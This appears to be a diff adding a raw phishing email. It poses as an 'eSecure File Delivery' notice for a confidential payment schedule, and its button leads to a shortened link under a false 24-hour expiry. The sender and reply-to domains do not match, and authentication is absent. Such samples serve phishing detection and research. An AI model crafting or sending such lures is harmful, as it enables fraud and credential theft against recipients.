@@ -1,0 +1,267 @@
+Return-Path: <eft@secure.net>
+Received: from 158-247-73-13.car3-cgn4-subnet.amplex.net (158-247-73-13.car3-cgn4-subnet.amplex.net [158.247.73.13])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id aptv998pefu9n8kmdspoa1hckh2th7sb7tjvnh81
+ for zingerpie@kfcreview.com;
+ Wed, 11 Nov 2026 04:31:02 +0000 (UTC)
+Received-SPF: none (spfCheck: 158.247.73.13 is neither permitted nor denied by domain of secure.net) client-ip=158.247.73.13; envelope-from=eft@secure.net; helo=158-247-73-13.car3-cgn4-subnet.amplex.net;
+Authentication-Results: amazonses.com;
+ spf=none (spfCheck: 158.247.73.13 is neither permitted nor denied by domain of secure.net) client-ip=158.247.73.13; envelope-from=eft@secure.net; helo=158-247-73-13.car3-cgn4-subnet.amplex.net;
+ dmarc=none header.from=secure.net;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFHODZwejdYNm8zRThleGg0OTl4L3RNQll3YVBCOGNSd3hTV0hnOUgram1VUDVMNkNjNTlPRnlOZHRYbEpUQWxDTU0xbGNJMUl2akdTN2dwSnZOUHVCVGIzNzdmMWNNVldDQTBxdGVYaXlQQ0R4ejlNQ2tIYXNQWm1SckdOT0hOVXpKRmd6Q1hMdGo5N1A1aDBLMU9IazdsS1B1TmgvRzdibktuUFEya0JXQ0IwMFpnRlppK0k3T0RsbXc5TVVmOW1NalYrdGIreUNYcGRFM1pmTmFEbmRQTkdKTXlqN3kxcEhzbFlicFc3Mk1QR0pJa3FUTDExOFUxSWJaaFhiR0J3a1A4eUtya0F2dGl2RGtrZzFrQ2t2WWlKd3hManpRbVZndGYyeHNPS2VWdmc9PQ==
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=LV7TDtk3ySyX9zpnXOj72Bgbg/OQ8JsoIinYrZoHH/DVv+hhnIQokop2rfpuS0E8PzNJ4MSw9JS5tVfN2c4AjgosLkz51Qn1Vj3bDKyPSfAorWjUz6foMTVPL40exzyLCjJEVgVE6Je5G62QuZ/BWO4aNyzly5a/5PklmvhMO5U=; c=relaxed/simple; s=kra23psoka5qyyh6gdejiiuof3nluwuz; d=amazonses.com; t=1794371463; v=1; bh=Gv8WlPsR4s45b6I7b4lQYGvS4F0z03kKIHVee3/nwu8=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+Reply-To: info@brucesandy.com
+From: Payment Confirmation <eft@secure.net>
+To: zingerpie@kfcreview.com
+Subject: EFT Payment Schedule
+Date: 10 Nov 2026 23:30:52 -0500
+Message-ID: <20261110233051.96935CD51D98CE5E@secure.net>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY>
+<DIV class=3Dx_x_logo style=3D'BOX-SIZING: border-box; FONT-SIZE: 24px; BOR=
+DER-TOP: 0px; FONT-FAMILY: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;=
+ BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; WHITE-SPACE: normal; WORD-SPA=
+CING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: bold; COL=
+OR: rgb(0,102,204) !important; PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEX=
+T-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORP=
+HANS: 2; WIDOWS: 2; MARGIN: 0px 0px 15px;=20
+LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,2=
+55); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: n=
+ormal; font-variant-numeric: inherit; font-variant-east-asian: inherit; fon=
+t-variant-alternates: inherit; font-variant-position: inherit; font-variant=
+-emoji: inherit; font-stretch: inherit; font-optical-sizing: inherit; font-=
+size-adjust: inherit; font-kerning: inherit; font-feature-settings: inherit=
+; font-variation-settings: inherit;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial' data-olk-copy-sour=
+ce=3D"MessageBody">eSecure File Delivery</DIV>
+<H1 style=3D'BOX-SIZING: border-box; FONT-SIZE: 28px; FONT-FAMILY: "Segoe U=
+I", Tahoma, Geneva, Verdana, sans-serif; WHITE-SPACE: normal; WORD-SPACING:=
+ 0px; BORDER-BOTTOM: rgb(234,234,234) 1px solid; TEXT-TRANSFORM: none; COLO=
+R: rgb(44,62,80) !important; PADDING-BOTTOM: 15px; FONT-STYLE: normal; TEXT=
+-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; ORPHANS: 2; WIDOWS: 2;=
+ MARGIN: 0px 0px 25px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROU=
+ND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px;=20
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial'>Secure Document for Review</H1>
+<DIV class=3Dx_x_document-info style=3D'BOX-SIZING: border-box; FONT-SIZE: =
+13px; FONT-FAMILY: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; BORDER-=
+RIGHT-WIDTH: 0px; BORDER-TOP-COLOR: ; VERTICAL-ALIGN: baseline; WHITE-SPACE=
+: normal; BORDER-BOTTOM-WIDTH: 0px; WORD-SPACING: 0px; TEXT-TRANSFORM: none=
+; FONT-WEIGHT: 400; COLOR: rgb(51,51,51) !important; PADDING-BOTTOM: 20px; =
+FONT-STYLE: normal; BORDER-BOTTOM-COLOR: ; PADDING-TOP: 20px; PADDING-LEFT:=
+ 20px; BORDER-LEFT: rgb(0,102,204) 4px solid;=20
+ORPHANS: 2; WIDOWS: 2; MARGIN: 0px 0px 25px; BORDER-RIGHT-COLOR: ; LETTER-S=
+PACING: normal; PADDING-RIGHT: 20px; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLO=
+R: rgb(249,249,249); TEXT-INDENT: 0px; font-variant-ligatures: normal; font=
+-variant-caps: normal; font-variant-numeric: inherit; font-variant-east-asi=
+an: inherit; font-variant-alternates: inherit; font-variant-position: inher=
+it; font-variant-emoji: inherit; font-stretch: inherit; font-optical-sizing=
+: inherit; font-size-adjust: inherit;=20
+font-kerning: inherit; font-feature-settings: inherit; font-variation-setti=
+ngs: inherit; -webkit-text-stroke-width: 0px; text-decoration-thickness: in=
+itial; text-decoration-style: initial; text-decoration-color: initial; bord=
+er-image: initial; border-radius: 8px'>
+<P style=3D'BOX-SIZING: border-box; FONT-FAMILY: -apple-system, BlinkMacSys=
+temFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoj=
+i", "Segoe UI Emoji", "Segoe UI Symbol"; PADDING-BOTTOM: 0px; PADDING-TOP: =
+0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 10px; PADDING-RIGHT: 0px'><STRONG s=
+tyle=3D'BOX-SIZING: border-box; FONT-FAMILY: "Segoe UI", Tahoma, Geneva, Ve=
+rdana, sans-serif; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px=
+; MARGIN: 0px; PADDING-RIGHT: 0px'>
+You have been granted access to confidential Agreement documents:</STRONG><=
+/P>
+<P style=3D'BOX-SIZING: border-box; FONT-FAMILY: -apple-system, BlinkMacSys=
+temFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoj=
+i", "Segoe UI Emoji", "Segoe UI Symbol"; PADDING-BOTTOM: 0px; PADDING-TOP: =
+0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 10px; PADDING-RIGHT: 0px'>A secure =
+document has been shared with you for your review.</P>
+<P style=3D'BOX-SIZING: border-box; FONT-FAMILY: -apple-system, BlinkMacSys=
+temFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoj=
+i", "Segoe UI Emoji", "Segoe UI Symbol"; PADDING-BOTTOM: 0px; PADDING-TOP: =
+0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 10px; PADDING-RIGHT: 0px'><STRONG s=
+tyle=3D'BOX-SIZING: border-box; FONT-FAMILY: "Segoe UI", Tahoma, Geneva, Ve=
+rdana, sans-serif; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px=
+; MARGIN: 0px; PADDING-RIGHT: 0px'>Document:</STRONG>
+<SPAN>&nbsp;</SPAN>&nbsp;<WBR style=3D'BOX-SIZING: border-box; FONT-FAMILY:=
+ "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; PADDING-BOTTOM: 0px; PADD=
+ING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px'>Payment_S=
+chedule.pdf<WBR style=3D'BOX-SIZING: border-box; FONT-FAMILY: "Segoe UI", T=
+ahoma, Geneva, Verdana, sans-serif; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; =
+PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px'></P>
+<P style=3D'BOX-SIZING: border-box; FONT-FAMILY: -apple-system, BlinkMacSys=
+temFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoj=
+i", "Segoe UI Emoji", "Segoe UI Symbol"; PADDING-BOTTOM: 0px; PADDING-TOP: =
+0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 10px; PADDING-RIGHT: 0px'><STRONG s=
+tyle=3D'BOX-SIZING: border-box; FONT-FAMILY: "Segoe UI", Tahoma, Geneva, Ve=
+rdana, sans-serif; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px=
+; MARGIN: 0px; PADDING-RIGHT: 0px'>
+Description:</STRONG><SPAN style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VER=
+TICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PA=
+DDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-R=
+IGHT: 0px">&nbsp;Payment Agreement</SPAN>&nbsp;Review</P></DIV>
+<DIV class=3Dx_x_btn-container style=3D'BOX-SIZING: border-box; FONT-SIZE: =
+13px; BORDER-TOP: 0px; FONT-FAMILY: "Segoe UI", Tahoma, Geneva, Verdana, sa=
+ns-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; WHITE-SPACE: normal;=
+ WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: =
+400; COLOR: rgb(51,51,51) !important; PADDING-BOTTOM: 0px; FONT-STYLE: norm=
+al; TEXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0=
+px; ORPHANS: 2; WIDOWS: 2; MARGIN: 30px 0px;=20
+LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,2=
+55); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: n=
+ormal; font-variant-numeric: inherit; font-variant-east-asian: inherit; fon=
+t-variant-alternates: inherit; font-variant-position: inherit; font-variant=
+-emoji: inherit; font-stretch: inherit; font-optical-sizing: inherit; font-=
+size-adjust: inherit; font-kerning: inherit; font-feature-settings: inherit=
+; font-variation-settings: inherit;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial'>
+&nbsp;<A title=3Dhttps://t.co/tfVCPumtGd class=3D"x_x_v1webfont x_x_v1cssbu=
+ttonpro" style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; BORDER-TOP=
+: medium none; BORDER-RIGHT: medium none; WIDTH: 300px; VERTICAL-ALIGN: bas=
+eline; WHITE-SPACE: normal; WORD-SPACING: 0px; MIN-WIDTH: 300px; BORDER-BOT=
+TOM: medium none; TEXT-TRANSFORM: none; COLOR: rgb(255,255,255) !important;=
+ PADDING-BOTTOM: 0px; TEXT-ALIGN: center; PADDING-TOP: 0px; FONT: bold 20px=
+/48px arial,=20
+helvetica, sans-serif; PADDING-LEFT: 0px; BORDER-LEFT: medium none; ORPHANS=
+: 2; WIDOWS: 2; MARGIN: 0px; DISPLAY: inline-block; LETTER-SPACING: normal;=
+ PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(37,95,130); TEXT-INDENT: 0px; bo=
+rder-radius: 4px" href=3D"https://t.co/tfVCPumtGd" rel=3D"noopener noreferr=
+er" target=3D_blank data-auth=3D"NotApplicable" data-linkindex=3D"0">
+<STRONG style=3D'BOX-SIZING: border-box; FONT-FAMILY: "Segoe UI", Tahoma, G=
+eneva, Verdana, sans-serif; FONT-WEIGHT: normal; COLOR: rgb(255,255,255) !i=
+mportant; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN:=
+ 0px; PADDING-RIGHT: 0px'><FONT style=3D'BOX-SIZING: border-box; FONT-FAMIL=
+Y: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; PADDING-BOTTOM: 0px; PA=
+DDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px' face=3D=
+Arial>eDocument Ready</FONT></STRONG></A><SPAN>
+&nbsp;</SPAN><SPAN style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-AL=
+IGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TO=
+P: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0p=
+x">&nbsp;</SPAN><SPAN style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL=
+-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING=
+-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT:=
+ 0px">&nbsp;</SPAN><SPAN>&nbsp;</SPAN>
+<SPAN style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; BORDER-TOP: 0px; FO=
+NT-FAMILY: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; BORDER-RIGHT: 0=
+px; VERTICAL-ALIGN: baseline; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDE=
+R-BOTTOM: 0px; TEXT-TRANSFORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: =
+rgb(51,51,51) !important; PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALI=
+GN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHANS:=
+ 2; WIDOWS: 2; MARGIN: 0px; DISPLAY: inline=20
+!important; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: r=
+gb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-var=
+iant-caps: normal; font-variant-numeric: inherit; font-variant-east-asian: =
+inherit; font-variant-alternates: inherit; font-variant-position: inherit; =
+font-variant-emoji: inherit; font-stretch: inherit; font-optical-sizing: in=
+herit; font-size-adjust: inherit; font-kerning: inherit; font-feature-setti=
+ngs: inherit; font-variation-settings: inherit;=20
+text-decoration-style: initial; text-decoration-color: initial'>&nbsp;</SPA=
+N>
+<BR style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; FONT-FAMILY: "Segoe U=
+I", Tahoma, Geneva, Verdana, sans-serif; WHITE-SPACE: normal; WORD-SPACING:=
+ 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51) !importa=
+nt; PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEXT-ALIGN: center; PADDING-TO=
+P: 0px; PADDING-LEFT: 0px; ORPHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACI=
+NG: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-IN=
+DENT: 0px; font-variant-ligatures: normal;=20
+font-variant-caps: normal; text-decoration-style: initial; text-decoration-=
+color: initial'>
+<DIV aria-hidden=3Dtrue style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; B=
+ORDER-TOP: 0px; FONT-FAMILY: "Segoe UI", Tahoma, Geneva, Verdana, sans-seri=
+f; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; WHITE-SPACE: normal; WORD-S=
+PACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; CO=
+LOR: rgb(51,51,51) !important; PADDING-BOTTOM: 0px; FONT-STYLE: normal; TEX=
+T-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORP=
+HANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING:=20
+normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
+: 0px; font-variant-ligatures: normal; font-variant-caps: normal; font-vari=
+ant-numeric: inherit; font-variant-east-asian: inherit; font-variant-altern=
+ates: inherit; font-variant-position: inherit; font-variant-emoji: inherit;=
+ font-stretch: inherit; font-optical-sizing: inherit; font-size-adjust: inh=
+erit; font-kerning: inherit; font-feature-settings: inherit; font-variation=
+-settings: inherit; text-decoration-style:=20
+initial; text-decoration-color: initial'>&nbsp;</DIV></DIV>
+<DIV class=3Dx_x_note style=3D'BOX-SIZING: border-box; FONT-SIZE: 13px; FON=
+T-FAMILY: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; BORDER-RIGHT-WID=
+TH: 0px; BORDER-TOP-COLOR: ; VERTICAL-ALIGN: baseline; WHITE-SPACE: normal;=
+ BORDER-BOTTOM-WIDTH: 0px; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WE=
+IGHT: 400; COLOR: rgb(51,51,51) !important; PADDING-BOTTOM: 15px; FONT-STYL=
+E: normal; BORDER-BOTTOM-COLOR: ; PADDING-TOP: 15px; PADDING-LEFT: 15px; BO=
+RDER-LEFT: rgb(255,204,0) 4px solid; ORPHANS: 2;=20
+WIDOWS: 2; MARGIN: 0px 0px 25px; BORDER-RIGHT-COLOR: ; LETTER-SPACING: norm=
+al; PADDING-RIGHT: 15px; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: rgb(255,2=
+49,230); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-cap=
+s: normal; font-variant-numeric: inherit; font-variant-east-asian: inherit;=
+ font-variant-alternates: inherit; font-variant-position: inherit; font-var=
+iant-emoji: inherit; font-stretch: inherit; font-optical-sizing: inherit; f=
+ont-size-adjust: inherit; font-kerning: inherit;=20
+font-feature-settings: inherit; font-variation-settings: inherit; -webkit-t=
+ext-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-=
+style: initial; text-decoration-color: initial; border-image: initial; bord=
+er-radius: 8px'>
+<P style=3D'BOX-SIZING: border-box; FONT-FAMILY: -apple-system, BlinkMacSys=
+temFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoj=
+i", "Segoe UI Emoji", "Segoe UI Symbol"; PADDING-BOTTOM: 0px; PADDING-TOP: =
+0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 1em; PADDING-RIGHT: 0px'><STRONG st=
+yle=3D'BOX-SIZING: border-box; FONT-FAMILY: "Segoe UI", Tahoma, Geneva, Ver=
+dana, sans-serif; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px;=
+ MARGIN: 0px; PADDING-RIGHT: 0px'>Note:</STRONG><SPAN>
+&nbsp;</SPAN><SPAN style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-AL=
+IGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TO=
+P: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0p=
+x"><SPAN style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
+DDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">&nbsp;<=
+/SPAN>&nbsp;</SPAN>
+This link will expire in<SPAN style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; =
+VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px;=
+ PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDIN=
+G-RIGHT: 0px">&nbsp;</SPAN><SPAN>&nbsp;</SPAN><STRONG style=3D'BOX-SIZING: =
+border-box; FONT-FAMILY: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; P=
+ADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDI=
+NG-RIGHT: 0px'>24 hours</STRONG>
+<SPAN style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline=
+; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDI=
+NG-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">&nbsp;</SP=
+AN><SPAN>&nbsp;</SPAN>for security reasons. Please review the document befo=
+re then.</P></DIV>
+<DIV class=3Dx_x_confidential style=3D'BOX-SIZING: border-box; FONT-SIZE: 1=
+4px; FONT-FAMILY: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; BORDER-R=
+IGHT-WIDTH: 0px; BORDER-TOP-COLOR: ; VERTICAL-ALIGN: baseline; WHITE-SPACE:=
+ normal; BORDER-BOTTOM-WIDTH: 0px; WORD-SPACING: 0px; TEXT-TRANSFORM: none;=
+ FONT-WEIGHT: 400; COLOR: rgb(51,51,51) !important; PADDING-BOTTOM: 15px; F=
+ONT-STYLE: normal; BORDER-BOTTOM-COLOR: ; PADDING-TOP: 15px; PADDING-LEFT: =
+15px; BORDER-LEFT: rgb(204,0,0) 4px solid; ORPHANS:=20
+2; WIDOWS: 2; MARGIN: 30px 0px 0px; BORDER-RIGHT-COLOR: ; LETTER-SPACING: n=
+ormal; PADDING-RIGHT: 15px; BORDER-TOP-WIDTH: 0px; BACKGROUND-COLOR: rgb(25=
+5,230,230); TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-=
+caps: normal; font-variant-numeric: inherit; font-variant-east-asian: inher=
+it; font-variant-alternates: inherit; font-variant-position: inherit; font-=
+variant-emoji: inherit; font-stretch: inherit; font-optical-sizing: inherit=
+; font-size-adjust: inherit; font-kerning:=20
+inherit; font-feature-settings: inherit; font-variation-settings: inherit; =
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial; border-image: init=
+ial; border-radius: 8px'>
+<P style=3D'BOX-SIZING: border-box; FONT-FAMILY: -apple-system, BlinkMacSys=
+temFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoj=
+i", "Segoe UI Emoji", "Segoe UI Symbol"; PADDING-BOTTOM: 0px; PADDING-TOP: =
+0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 1em; PADDING-RIGHT: 0px'><STRONG st=
+yle=3D'BOX-SIZING: border-box; FONT-FAMILY: "Segoe UI", Tahoma, Geneva, Ver=
+dana, sans-serif; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px;=
+ MARGIN: 0px; PADDING-RIGHT: 0px'>
+CONFIDENTIAL:</STRONG><SPAN style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VE=
+RTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; P=
+ADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-=
+RIGHT: 0px">&nbsp;</SPAN><SPAN>&nbsp;</SPAN>
+This message contains confidential information and is intended only for zin=
+gerpie@kfcreview.com. If you are not the named addressee, you should not di=
+sseminate, distribute or copy this email. Please notify the sender immediat=
+ely if you have received this email by mistake and delete this email from y=
+our system.</P></DIV></BODY></HTML>
